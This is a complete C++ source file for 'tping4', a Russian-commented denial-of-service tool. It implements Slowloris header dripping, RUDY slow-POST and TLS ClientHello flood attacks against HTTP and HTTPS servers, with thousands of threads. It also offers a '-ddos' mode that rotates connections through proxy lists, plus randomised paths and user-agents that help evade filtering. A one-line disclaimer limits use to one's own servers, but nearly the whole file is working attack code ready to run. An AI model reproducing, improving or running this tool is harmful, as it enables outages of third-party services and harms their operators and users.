// tping4.cpp — L7 Slowloris / TLS-handshake / RUDY, HTTP и HTTPS.
// Только для тестирования своих серверов.
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <atomic>
#include <chrono>
#include <csignal>
#include <fstream>
#include <iostream>
#include <mutex>
#include <random>
#include <string>
#include <thread>
#include <vector>

std::atomic<bool> g_stop{false};
std::atomic<uint64_t> g_alive{0}, g_sent{0}, g_err{0};
void on_signal(int) { g_stop = true; }

enum class Mode { Slowloris, Handshake, Rudy };

struct Cfg {
    std::string url, host, path = "/", proxy_file, ua_file;
    uint16_t port = 80;
    int threads = 256, duration = 0, ka = 5000;
    bool rand_path = false, rand_ua = false, use_proxy = false;
    bool tls = false;
    Mode mode = Mode::Slowloris;
};
struct Proxy { std::string host; uint16_t port; };

std::vector<std::string> g_uas = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1",
};
std::vector<Proxy> g_proxies;
std::mutex g_mtx;

// ---------- SSL ----------

SSL_CTX* g_ctx = nullptr;

void ssl_init() {
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    g_ctx = SSL_CTX_new(TLS_client_method());
    SSL_CTX_set_verify(g_ctx, SSL_VERIFY_NONE, nullptr);
    SSL_CTX_set_min_proto_version(g_ctx, TLS1_2_VERSION);
}

// ---------- URL ----------

bool parse_url(const std::string& u, Cfg& c) {
    std::string s = u;
    if (s.rfind("https://", 0) == 0) { c.tls = true; c.port = 443; s = s.substr(8); }
    else if (s.rfind("http://", 0) == 0) { c.tls = false; c.port = 80; s = s.substr(7); }
    else { std::cerr << "[!] нужен http:// или https://\n"; return false; }
    auto sl = s.find('/');
    std::string hp = sl == std::string::npos ? s : s.substr(0, sl);
    c.path = sl == std::string::npos ? "/" : s.substr(sl);
    auto co = hp.find(':');
    c.host = co == std::string::npos ? hp : hp.substr(0, co);
    if (co != std::string::npos) c.port = (uint16_t)std::stoi(hp.substr(co + 1));
    return !c.host.empty();
}

bool resolve(const std::string& h, uint16_t p, sockaddr_in& out) {
    addrinfo hints{}; hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
    addrinfo* r = nullptr;
    if (::getaddrinfo(h.c_str(), nullptr, &hints, &r) || !r) return false;
    out = *(sockaddr_in*)r->ai_addr; out.sin_port = htons(p);
    ::freeaddrinfo(r); return true;
}

int connect_to(const sockaddr_in& a) {
    int fd = ::socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    if (::connect(fd, (sockaddr*)&a, sizeof(a)) < 0) { ::close(fd); return -1; }
    int one = 1; ::setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    return fd;
}

bool send_all(int fd, const std::string& d) {
    for (size_t s = 0; s < d.size();) {
        ssize_t n = ::send(fd, d.data() + s, d.size() - s, MSG_NOSIGNAL);
        if (n <= 0) return false;
        s += (size_t)n;
        g_sent += (uint64_t)n;
    }
    return true;
}

// ---------- Loaders ----------

std::vector<Proxy> load_proxies(const std::string& f) {
    std::vector<Proxy> v; std::ifstream in(f); std::string l;
    if (!in) { std::cerr << "[!] нет файла " << f << "\n"; return v; }
    while (std::getline(in, l)) {
        if (l.empty() || l[0] == '#') continue;
        auto c = l.find(':'); if (c == std::string::npos) continue;
        try { v.push_back({l.substr(0, c), (uint16_t)std::stoi(l.substr(c + 1))}); } catch (...) {}
    }
    return v;
}

void load_uas(const std::string& f) {
    std::ifstream in(f); if (!in) return;
    std::vector<std::string> v; std::string l;
    while (std::getline(in, l)) if (!l.empty()) v.push_back(l);
    if (!v.empty()) g_uas.swap(v);
}

std::string pick_path(const Cfg& c, std::mt19937& r) {
    if (!c.rand_path) return c.path;
    std::uniform_int_distribution<int> len(4, 16), ch(0, 9);
    static const char* p[] = {"a","b","c","d","e","f","g","h","i","j"};
    std::string s = "/";
    for (int i = len(r); i > 0; --i) s += p[ch(r)];
    return s;
}

std::string pick_ua(std::mt19937& r) {
    if (g_uas.empty()) return "Mozilla/5.0";
    std::uniform_int_distribution<size_t> d(0, g_uas.size() - 1);
    return g_uas[d(r)];
}

// ---------- TLS helpers ----------

// Полный handshake (для slowloris/rudy).
SSL* tls_start(int fd, const std::string& sni) {
    SSL* s = SSL_new(g_ctx);
    if (!s) return nullptr;
    SSL_set_fd(s, fd);
    SSL_set_tlsext_host_name(s, sni.c_str());
    if (SSL_connect(s) != 1) { SSL_free(s); return nullptr; }
    return s;
}

// Частичный handshake: только ClientHello, без ожидания Finished.
bool tls_send_hello_only(int fd, const std::string& sni) {
    SSL* s = SSL_new(g_ctx);
    if (!s) return false;
    SSL_set_fd(s, fd);
    SSL_set_tlsext_host_name(s, sni.c_str());
    // Не зовём SSL_connect до конца — только первый шаг.
    SSL_set_connect_state(s);
    int r = SSL_do_handshake(s);
    // Ожидаемо вернёт <=0 с WANT_READ — это и нужно: ClientHello отправлен.
    (void)r;
    SSL_free(s);
    return true;
}

bool ssl_send_all(SSL* s, const std::string& d) {
    for (size_t off = 0; off < d.size();) {
        int n = SSL_write(s, d.data() + off, (int)(d.size() - off));
        if (n <= 0) return false;
        off += (size_t)n;
        g_sent += (uint64_t)n;
    }
    return true;
}

// ---------- Worker ----------

void worker(const Cfg& cfg, const sockaddr_in& target) {
    std::mt19937 rng(std::random_device{}() ^ (uint32_t)std::hash<std::thread::id>{}(std::this_thread::get_id()));
    std::uniform_int_distribution<int> jit(0, 500);

    while (!g_stop) {
        int fd = -1;
        // Прокси
        if (cfg.use_proxy && !g_proxies.empty()) {
            std::lock_guard<std::mutex> lk(g_mtx);
            std::uniform_int_distribution<size_t> d(0, g_proxies.size() - 1);
            Proxy p = g_proxies[d(rng)];
            sockaddr_in pa{};
            if (!resolve(p.host, p.port, pa)) { g_err++; continue; }
            fd = connect_to(pa);
            if (fd < 0) { g_err++; continue; }
            std::string conn = "CONNECT " + cfg.host + ":" + std::to_string(cfg.port) +
                               " HTTP/1.1\r\nHost: " + cfg.host + "\r\n\r\n";
            if (!send_all(fd, conn)) { ::close(fd); g_err++; continue; }
            char b[512]; ::recv(fd, b, sizeof(b), 0);
        } else {
            fd = connect_to(target);
            if (fd < 0) { g_err++; std::this_thread::sleep_for(std::chrono::milliseconds(500)); continue; }
        }

        // Режим handshake-flood: только ClientHello, без полного TLS
        if (cfg.tls && cfg.mode == Mode::Handshake) {
            if (!tls_send_hello_only(fd, cfg.host)) { ::close(fd); g_err++; continue; }
            g_alive++;
            // Держим TCP открытым, ничего больше не шлём
            while (!g_stop) std::this_thread::sleep_for(std::chrono::milliseconds(1000));
            ::close(fd);
            g_alive--;
            continue;
        }

        // TLS-хендшейк для slowloris/rudy
        SSL* ssl = nullptr;
        if (cfg.tls) {
            ssl = tls_start(fd, cfg.host);
            if (!ssl) { ::close(fd); g_err++; continue; }
        }

        auto net_send = [&](const std::string& d) -> bool {
            return ssl ? ssl_send_all(ssl, d) : send_all(fd, d);
        };

        std::string head;
        if (cfg.mode == Mode::Rudy) {
            // Slow POST: заявляем большой Content-Length, тело шлём по байту.
            head = "POST " + pick_path(cfg, rng) + " HTTP/1.1\r\n"
                   "Host: " + cfg.host + "\r\n"
                   "User-Agent: " + pick_ua(rng) + "\r\n"
                   "Content-Type: application/x-www-form-urlencoded\r\n"
                   "Content-Length: 1000000\r\n"
                   "Connection: keep-alive\r\n\r\n";
        } else {
            head = "GET " + pick_path(cfg, rng) + " HTTP/1.1\r\n"
                   "Host: " + cfg.host + "\r\n"
                   "User-Agent: " + pick_ua(rng) + "\r\n"
                   "Accept: */*\r\n"
                   "Connection: keep-alive\r\n";
        }
        if (!net_send(head)) { if (ssl) SSL_free(ssl); ::close(fd); g_err++; continue; }
        g_alive++;

        uint64_t seq = 0;
        while (!g_stop) {
            std::string drip;
            if (cfg.mode == Mode::Rudy) drip = "a";
            else                       drip = "X-" + std::to_string(seq++) + ": a\r\n";
            if (!net_send(drip)) break;
            std::this_thread::sleep_for(std::chrono::milliseconds(cfg.ka + jit(rng)));
        }

        if (ssl) { SSL_shutdown(ssl); SSL_free(ssl); }
        ::close(fd);
        g_alive--;
    }
}

// ---------- CLI ----------

void usage(const char* a0) {
    std::cout <<
        "tping4 - L7 нагрузчик: slowloris / rudy / handshake. HTTP и HTTPS.\n"
        "Только для тестирования своих серверов.\n"
        "\n"
        "Usage: " << a0 << " -url http(s)://host[:port]/path [опции]\n"
        "\n"
        "  -url URL       цель, http:// или https:// (обязательно)\n"
        "  -t N           потоков/соединений, 1..4096 (default 256)\n"
        "  -d SEC         длительность сек, 0=бесконечно\n"
        "  -l             синоним -d 0, стоп по Ctrl+C\n"
        "  -ka MS         интервал между каплями, мс (default 5000)\n"
        "  -mode MODE     slowloris | rudy | handshake (default slowloris)\n"
        "                   slowloris - медленные HTTP-заголовки\n"
        "                   rudy      - медленный POST (тело по байту)\n"
        "                   handshake - только TLS ClientHello, без Finished\n"
        "                               (работает только с https://)\n"
        "  -rand-path     случайный URI\n"
        "  -rand-ua       случайный User-Agent\n"
        "  -rand          -rand-path + -rand-ua\n"
        "  -ua FILE       файл со списком User-Agent\n"
        "  -dos           локальный IP (default)\n"
        "  -ddos          через прокси, требует -proxy\n"
        "  -proxy FILE    файл со списком прокси host:port\n"
        "  -table         таблица размеров b/kb/mb/gb/t\n"
        "  -help, -h      эта справка\n"
        "\n"
        "Примеры:\n"
        "  " << a0 << " -url http://127.0.0.1/ -t 500 -d 300\n"
        "  " << a0 << " -url https://127.0.0.1/ -t 500 -d 300 -mode slowloris\n"
        "  " << a0 << " -url https://127.0.0.1/ -t 1000 -d 600 -mode handshake\n"
        "  " << a0 << " -url https://127.0.0.1/ -t 300 -d 300 -mode rudy -ka 10000\n"
        "  " << a0 << " -url https://127.0.0.1/ -t 200 -ddos -proxy proxies.txt\n"
        "\n"
        "Остановка: Ctrl+C или SIGTERM.\n"
        "Ограничения: TLS verify выключен (self-signed ок). HTTP/2 не поддержан.\n"
        "Дисклеймер: только для собственных серверов или с письменного разрешения.\n";
}

void print_table() {
    std::cout << "b байты\nkb килобайты\nmb мегабайты\ngb гигабайты\nt терабайты\n";
}

Mode parse_mode(const std::string& m) {
    if (m == "slowloris") return Mode::Slowloris;
    if (m == "rudy")      return Mode::Rudy;
    if (m == "handshake") return Mode::Handshake;
    std::cerr << "[!] неизвестный -mode: " << m << "\n";
    std::exit(1);
}

int main(int argc, char** argv) {
    Cfg cfg;
    for (int i = 1; i < argc; ++i) {
        std::string a = argv[i];
        auto nx = [&](const char* n) -> std::string {
            if (i + 1 >= argc) { std::cerr << "[!] " << n << " требует аргумент\n"; std::exit(1); }
            return argv[++i];
        };
        if      (a == "-url")       cfg.url = nx("-url");
        else if (a == "-t")         cfg.threads = std::stoi(nx("-t"));
        else if (a == "-d")         cfg.duration = std::stoi(nx("-d"));
        else if (a == "-l")         cfg.duration = 0;
        else if (a == "-ka")        cfg.ka = std::stoi(nx("-ka"));
        else if (a == "-mode")      cfg.mode = parse_mode(nx("-mode"));
        else if (a == "-rand-path") cfg.rand_path = true;
        else if (a == "-rand-ua")   cfg.rand_ua = true;
        else if (a == "-rand")      cfg.rand_path = cfg.rand_ua = true;
        else if (a == "-ua")        cfg.ua_file = nx("-ua");
        else if (a == "-dos")       cfg.use_proxy = false;
        else if (a == "-ddos")      cfg.use_proxy = true;
        else if (a == "-proxy")     cfg.proxy_file = nx("-proxy");
        else if (a == "-table")     { print_table(); return 0; }
        else if (a == "-help" || a == "-h") { usage(argv[0]); return 0; }
        else { std::cerr << "[!] неизвестный флаг: " << a << "\n"; usage(argv[0]); return 1; }
    }
    if (cfg.url.empty()) { usage(argv[0]); return 1; }
    if (cfg.threads < 1 || cfg.threads > 4096) { std::cerr << "[!] -t 1..4096\n"; return 1; }
    if (!parse_url(cfg.url, cfg)) return 1;
    if (cfg.mode == Mode::Handshake && !cfg.tls) {
        std::cerr << "[!] -mode handshake требует https://\n"; return 1;
    }
    if (cfg.use_proxy) {
        if (cfg.proxy_file.empty()) { std::cerr << "[!] -ddos требует -proxy FILE\n"; return 1; }
        g_proxies = load_proxies(cfg.proxy_file);
        if (g_proxies.empty()) { std::cerr << "[!] список прокси пуст\n"; return 1; }
    }
    if (!cfg.ua_file.empty()) load_uas(cfg.ua_file);

    sockaddr_in target{};
    if (!resolve(cfg.host, cfg.port, target)) { std::cerr << "[!] не резолвится " << cfg.host << "\n"; return 2; }

    if (cfg.tls) ssl_init();

    std::signal(SIGINT, on_signal);
    std::signal(SIGTERM, on_signal);
    std::signal(SIGPIPE, SIG_IGN);

    const char* mode_s = cfg.mode == Mode::Slowloris ? "slowloris"
                       : cfg.mode == Mode::Rudy      ? "rudy"
                                                     : "handshake";
    std::cerr << "[*] tping4 -> " << (cfg.tls ? "https://" : "http://")
              << cfg.host << ":" << cfg.port << cfg.path
              << " t=" << cfg.threads << " ka=" << cfg.ka << "ms"
              << " mode=" << mode_s
              << " net=" << (cfg.use_proxy ? "ddos" : "dos") << "\n";

    std::vector<std::thread> pool;
    for (int i = 0; i < cfg.threads; ++i) pool.emplace_back(worker, std::cref(cfg), std::cref(target));

    auto t0 = std::chrono::steady_clock::now();
    while (!g_stop) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        auto el = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - t0).count();
        std::cerr << "\r[*] alive=" << g_alive.load() << " sent=" << g_sent.load() << "B err=" << g_err.load()
                  << " t=" << el << "s   " << std::flush;
        if (cfg.duration > 0 && el >= cfg.duration) { g_stop = true; break; }
    }
    std::cerr << "\n[*] stopping...\n";
    for (auto& t : pool) t.join();
    if (g_ctx) SSL_CTX_free(g_ctx);
    std::cerr << "[*] done. alive=" << g_alive.load() << " sent=" << g_sent.load() << "B err=" << g_err.load() << "\n";
    return 0;
}